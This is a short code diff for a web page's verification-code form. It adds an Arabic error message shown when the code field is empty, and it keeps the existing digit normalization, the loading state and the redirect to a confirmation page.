@@ -5,6 +5,7 @@
     const loading = $('loading');
     const verifyBtn = $('verifyBtn');
     const whatsappBtn = $('whatsappBtn');
+    const otpError = $('otpError');
     const yearEl = document.querySelector('#year');
     const WHATSAPP_URL = 'https://wa.me/message/I77OHUE4I7XSF1';
     if(whatsappBtn) whatsappBtn.href = WHATSAPP_URL;
@@ -15,10 +16,19 @@
     return (str+'').replace(/[٠-٩۰-۹]/g, d => map[d] || d);
   }
 
+    if(otp) otp.addEventListener('input',()=>{ if(otpError) otpError.style.display='none'; });
+
     form.addEventListener('submit', async function(e){
       e.preventDefault();
       const code = normalizeDigits(otp.value).replace(/\D+/g,'');
-      if(!code) return;
+      if(!code){
+        if(otpError){
+          otpError.textContent='يرجى إدخال رمز التحقق';
+          otpError.style.display='block';
+        }
+        return;
+      }
+      if(otpError) otpError.style.display='none';
       loading.style.display='block';
       verifyBtn.disabled=true;
       const orderId = Math.floor(100000 + Math.random()*900000);
@@ -33,4 +43,4 @@
       }
       window.location.href = 'confirmation.html?order=' + orderId;
     });
-  })();
+    })();
